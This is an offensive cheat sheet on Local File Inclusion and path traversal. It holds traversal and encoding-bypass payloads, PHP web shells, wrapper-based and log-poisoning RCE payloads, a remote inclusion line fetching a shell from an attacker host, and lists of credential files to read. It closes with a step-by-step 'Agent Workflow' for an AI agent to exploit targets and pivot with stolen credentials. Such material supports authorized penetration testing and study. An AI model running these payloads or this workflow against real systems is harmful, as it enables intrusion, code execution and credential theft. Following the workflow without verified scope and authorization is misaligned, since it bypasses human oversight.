# LFI / Path Traversal

> **Summary**: Local File Inclusion (LFI) and Path Traversal allow reading arbitrary files from the server by manipulating file path parameters. LFI can escalate to Remote Code Execution through log poisoning, PHP wrappers, and file upload chains.
> **Impact**: Sensitive file disclosure, source code leak, credential theft, Remote Code Execution
> **Typical Severity**: High - Critical

## Detection

### Indicators
- URL parameters referencing file paths: `page=`, `file=`, `path=`, `lang=`, `template=`, `include=`
- Error messages revealing file system paths
- Application serving different content based on path manipulation

### Automated Detection
```bash
# Fuzz for LFI-vulnerable parameters
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<TARGET>/index.php?FUZZ=value' -fs <BASELINE_SIZE>

# Fuzz LFI payloads on known parameter
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/index.php?<PARAM>=FUZZ' -fs <BASELINE_SIZE>

# Fuzz webroot path
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<TARGET>/index.php?<PARAM>=../../../../FUZZ/index.php' -fs <BASELINE_SIZE>

# Automated LFI scanner
# https://github.com/kurobeats/fimap
fimap -u "https://<TARGET>?<PARAM>="
```

### Manual Detection
- Try basic traversal: `?page=../../../etc/passwd`
- Try with encoding: `?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- If browser mangles the path, use wget: `wget http://<TARGET>/page.php?url=../../../../../../../etc/passwd`
- Success: response contains file content (e.g., `root:x:0:0:` for /etc/passwd)

## Exploitation

### Basic LFI

| Payload | Description |
|---------|-------------|
| `/index.php?language=/etc/passwd` | Basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |

### Path Traversal Payloads

```
../
..\
..;/
..%5c
..%2f
..;\
..%252f
%2e%2e%252f
%252%66.%252%65
```

### Interesting Files

| OS | File |
|----|------|
| Linux | `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/proc/self/environ` |
| Windows | `C:\Windows\win.ini`, `C:\boot.ini` |
| Generic | `.env`, `config.php`, `web.config`, `wp-config.php` |

### Remote Code Execution via LFI

| Payload | Description |
|---------|-------------|
| **PHP Wrappers** | |
| `?lang=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<TARGET>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `?lang=expect://id` | RCE with expect wrapper |
| `?lang=php://filter/read=convert.base64-encode/resource=config` | Read PHP source with base64 filter |
| **RFI** | |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <PORT>` | Host web shell |
| `?lang=http://<ATTACKER_IP>:<PORT>/shell.php&cmd=id` | Include remote PHP web shell |
| **LFI + Upload** | |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `?lang=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive |
| `?lang=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar |
| `?lang=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |
| **Log Poisoning** | |
| `curl -s "http://<TARGET>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log via User-Agent |
| `?lang=/var/log/apache2/access.log&cmd=id` | RCE through poisoned access log |
| `?lang=/var/lib/php/sessions/sess_<SESSION_ID>&cmd=id` | RCE through poisoned PHP session |

## Bypasses

### Nested Traversal Sequences
When the application strips `../` once:
```
....//
....\/
..../\
....\\
```

### URL Encoding
| Character | Single Encode | Double Encode |
|-----------|--------------|---------------|
| `.` (dot) | `%2e` | `%252e` |
| `/` (forward slash) | `%2f` | `%252f` |
| `\` (backslash) | `%5c` | `%255c` |
| `%` (percent) | `%25` | - |

### Double URL Encoding
```
%252%66 -> %2f -> /
%252%65 -> %2e -> .
%252f -> %2f -> /
%252e -> %2e -> .
```

### Null Byte
Stops processing, ignoring appended extension (works on older PHP < 5.3):
```
http://<TARGET>/page=../../../etc/passwd%00
```

### Path Truncation (Obsolete)
```
/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

### PHP Filter Bypass
```
php://filter/zlib.deflate/convert.base64-encode/resource=<FILE>
```

## Escalation

- Chain with [File Upload](file-upload.md) for RCE via uploaded webshell
- Chain with [SSRF](ssrf.md) for accessing internal files
- Use to read source code and find other vulnerabilities (hardcoded credentials, SQL injection, etc.)
- [403 Bypass](../bypass/403.md) techniques may help access restricted paths

## File Inclusion Functions

| Function | Read Content | Execute | Remote URL |
|----------|:----------:|:-------:|:----------:|
| **PHP** | | | |
| `include()`/`include_once()` | Yes | Yes | Yes |
| `require()`/`require_once()` | Yes | Yes | No |
| `file_get_contents()` | Yes | No | Yes |
| `fopen()`/`file()` | Yes | No | No |
| **NodeJS** | | | |
| `fs.readFile()` | Yes | No | No |
| `fs.sendFile()` | Yes | No | No |
| `res.render()` | Yes | Yes | No |
| **Java** | | | |
| `include` | Yes | No | No |
| `import` | Yes | Yes | Yes |
| **.NET** | | | |
| `@Html.Partial()` | Yes | No | No |
| `@Html.RemotePartial()` | Yes | No | Yes |
| `Response.WriteFile()` | Yes | No | No |
| `include` | Yes | Yes | Yes |

## Tools

| Tool | Usage |
|------|-------|
| [fimap](https://github.com/kurobeats/fimap) | Automated LFI scanner |
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) | LFI fuzzing wordlist |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) | SecLists LFI collection |
| [Linux webroot wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) | Webroot path discovery |
| [Windows webroot wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) | Webroot path discovery |
| [Linux server configs](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) | Server configuration files |
| [Windows server configs](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) | Server configuration files |
| [weird_proxies](https://github.com/GrrrDog/weird_proxies) | Proxy-specific path traversal bypasses |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. **Identify file inclusion parameters**:
   - Spider the application and collect all URL parameters. Flag parameters with names suggesting file paths: `page=`, `file=`, `include=`, `path=`, `template=`, `lang=`, `dir=`, `doc=`, `folder=`, `view=`, `content=`, `layout=`, `mod=`, `conf=`.
   - Note each candidate: `<TARGET_URL>?<PARAM>=<CURRENT_VALUE>`.
2. **Fuzz for hidden LFI parameters**:
   - Run: `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u '<TARGET_URL>?FUZZ=etc/passwd' -fs <BASELINE_SIZE>`.
   - Any response size differing from baseline indicates a potential inclusion parameter.
3. **Check error messages**:
   - Submit invalid values (e.g., `?<PARAM>=nonexistent_file_xyz`) and inspect error messages for file system paths (e.g., `/var/www/html/`, `C:\inetpub\`).
   - Record `<WEBROOT_PATH>` if disclosed.

### Phase 2: Validation
1. **Test basic path traversal**:
   - Submit: `?<PARAM>=../../../../../../../etc/passwd`.
   - **IF** response contains `root:x:0:0:` --> LFI confirmed (Linux). Proceed to Phase 3.
   - Submit: `?<PARAM>=../../../../../../../windows/win.ini`.
   - **IF** response contains `[fonts]` --> LFI confirmed (Windows). Proceed to Phase 3.
2. **IF basic traversal fails, test bypass techniques in order**:
   - **Null byte** (PHP < 5.3.4): `?<PARAM>=../../../etc/passwd%00`.
   - **Double encoding**: `?<PARAM>=..%252f..%252f..%252fetc%252fpasswd`.
   - **Nested traversal** (strips `../` once): `?<PARAM>=....//....//....//etc/passwd`.
   - **Path with allowed prefix**: `?<PARAM>=./languages/../../../etc/passwd`.
   - **URL encoding**: `?<PARAM>=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`.
   - **IF** any bypass returns file contents --> LFI confirmed. Record the working bypass technique as `<BYPASS_METHOD>`.
3. **Test PHP wrappers** (PHP applications):
   - `?<PARAM>=php://filter/convert.base64-encode/resource=index` -- **IF** base64 output returned --> PHP filter works. Decode to read source code.
   - `?<PARAM>=php://filter/zlib.deflate/convert.base64-encode/resource=<FILE>` -- alternative filter chain.
   - **IF** filters work --> record `<WRAPPER_METHOD>` for Phase 3 escalation.

### Phase 3: Exploitation
1. **Achieve RCE via log poisoning**:
   - Identify log file paths: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`.
   - **IF** log file is readable via LFI --> poison it:
     - Send request with User-Agent: `<?php system($_GET["cmd"]); ?>`.
     - Include the log: `?<PARAM>=/var/log/apache2/access.log&cmd=id`.
     - **IF** command output appears --> RCE achieved.
2. **Achieve RCE via PHP wrappers**:
   - `data://` wrapper: `?<PARAM>=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id`.
   - `php://input` wrapper: `curl -X POST --data '<?php system($_GET["cmd"]); ?>' "<TARGET_URL>?<PARAM>=php://input&cmd=id"`.
   - `expect://` wrapper: `?<PARAM>=expect://id`.
   - **IF** any wrapper returns command output --> RCE confirmed.
3. **Achieve RCE via file upload + LFI chain**:
   - Upload a file containing PHP code (e.g., image with `GIF89a<?php system($_GET["cmd"]); ?>` prepended).
   - Include the uploaded file: `?<PARAM>=<UPLOAD_PATH>/shell.gif&cmd=id`.
   - **IF** command output appears --> RCE via upload chain.
4. **Achieve RCE via PHP filter chain** (no file write needed):
   - Use [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) to generate a filter chain that produces arbitrary PHP code from `php://filter`.
   - `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` --> produces a long `php://filter/...` payload.
   - Include the generated chain: `?<PARAM>=<GENERATED_CHAIN>&cmd=id`.

### Phase 4: Escalation
1. **Read sensitive configuration files**:
   - Web app configs: `wp-config.php`, `.env`, `config.php`, `settings.py`, `application.properties`, `web.config`.
   - System credentials: `/etc/shadow` (if readable), `/etc/ssh/sshd_config`, `~/.ssh/id_rsa`.
   - Cloud metadata: `/proc/self/environ` (may contain AWS keys, secrets).
   - Database configs: extract credentials and attempt database access.
2. **Source code analysis**:
   - Use `php://filter/convert.base64-encode/resource=<FILE>` to read application source code.
   - Analyze source for: hardcoded credentials, SQL injection, additional endpoints, API keys.
3. **Pivot to further attacks**:
   - Credentials found --> attempt login to admin panels, databases, SSH.
   - Internal paths found --> chain with [SSRF](ssrf.md) or [File Upload](file-upload.md).

## Decision Tree

```
Start: File inclusion parameter identified (?<PARAM>=<VALUE>)
|
|--> Test basic traversal: ../../../../etc/passwd
|    |
|    |--> [File contents returned] --> DIRECT LFI CONFIRMED
|    |    |--> Read sensitive files (Phase 4)
|    |    |--> Attempt RCE via log poisoning or wrappers (Phase 3)
|    |
|    |--> [Blocked or filtered] --> Test bypass techniques
|         |
|         |--> Null byte (%00) --> Double encoding (%252f) --> Nested (....//....) --> URL encoding
|         |    |
|         |    |--> [Any bypass works] --> LFI CONFIRMED WITH BYPASS
|         |    |    |--> Continue with working bypass method
|         |    |
|         |    |--> [All bypasses fail] --> Test PHP WRAPPERS
|         |         |
|         |         |--> php://filter/convert.base64-encode/resource=<FILE>
|         |         |    |
|         |         |    |--> [Base64 output returned] --> PHP FILTER LFI
|         |         |    |    |--> Read source code via filters
|         |         |    |    |--> Attempt RCE via php_filter_chain_generator
|         |         |    |
|         |         |    |--> [Blocked] --> Test data:// and php://input wrappers
|         |         |
|         |         |--> data://text/plain;base64,<B64_PAYLOAD>
|         |         |    |
|         |         |    |--> [Code executes] --> RCE VIA DATA WRAPPER
|         |         |    |--> [Blocked] --> Test LOG POISONING
|         |         |
|         |         |--> Include /var/log/apache2/access.log after poisoning User-Agent
|         |              |
|         |              |--> [Code executes] --> RCE VIA LOG POISONING
|         |              |--> [Log not readable] --> Test PHP FILTER CHAINS
|         |                   |
|         |                   |--> [Chain generates output] --> RCE VIA FILTER CHAIN
|         |                   |--> [Nothing works] --> LFI limited to file read only
```

## Success Criteria

- **Minimum PoC**: Demonstrated ability to read a file outside the intended directory (`/etc/passwd` or equivalent).
- **Confirmed Impact**: Successfully read sensitive configuration files containing credentials (`.env`, `wp-config.php`, database configs).
- **RCE Achieved**: Obtained command execution via log poisoning, PHP wrappers, filter chains, or file upload + include.
- **Evidence Required**: HTTP request/response pairs showing the traversal payload and the returned file contents or command output.

## References

| URL | Description |
|-----|-------------|
| [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) | Comprehensive LFI/RFI guide |
| [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | Payload collection |
